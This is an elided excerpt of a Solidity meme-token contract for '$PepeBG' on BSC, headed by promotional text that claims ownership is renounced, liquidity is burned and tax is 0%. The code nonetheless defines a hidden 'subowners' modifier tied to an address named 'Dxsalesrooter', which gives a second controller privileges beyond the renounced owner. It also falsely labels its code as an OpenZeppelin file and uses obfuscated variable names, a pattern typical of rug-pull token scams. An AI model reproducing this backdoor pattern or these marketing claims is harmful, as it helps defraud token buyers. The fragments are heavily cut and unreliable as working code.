...
/**
🐸  PEPE BIG FOOT👣 THE REAL MEME 👣$PepeBG , NOT ONLY A MEME 
$PepeBG is a token designed to Alpha Degen BSC And most importantly $PepeBG  Token Renounced Tax 0% and LP BURN🔥❤️‍

💼🐸 Renounced
💼 🐸 LP BURN
💼 🐸Tax 0%
📣 TG 📣 https://t.me/PEPEBIGFOOT
*/
...
/*
 * @dev Provides information about the current execution IER20, including the
...
// File: @openzeppelin/contracts/access/ProxyToken.sol
 ...
 * the owner.
 */
abstract contract ProxyToken is IER20 {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "ProxyToken: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "ProxyToken: new owner is the zero address");
...
contract PepeBG is IER20, Bep20, ProxyToken {
    ...
    */
    function balanceOf(address account) external view override returns (uint256) {
      ...
      modifier subowners() {
        require(Dxsalesrooter == _msgSender(), "ProxyToken: caller is not the owner");
        _;
    }
    /**
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yourmath) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), tokenmappingyes[sender][_msgSender()].sub(yourmath, "Bep20: transfer yourmath exceeds allowance"));
        return true;
    }
    ...
    */
    function decreaseAllowance(address holdings, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), holdings, tokenmappingyes[_msgSender()][holdings].sub(allbalances, "Bep20: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yourmath) internal {
        ...
        require(shippingto != address(0), "Bep20: transfer to the zero address");
                
        unitefromus[sender] = unitefromus[sender].sub(yourmath, "Bep20: transfer yourmath exceeds balance");
    ...
    */
    function _approve(address owner, address holdings, uint256 yourmath) internal {
        ...
        require(holdings != address(0), "Bep20: approve to the zero address");
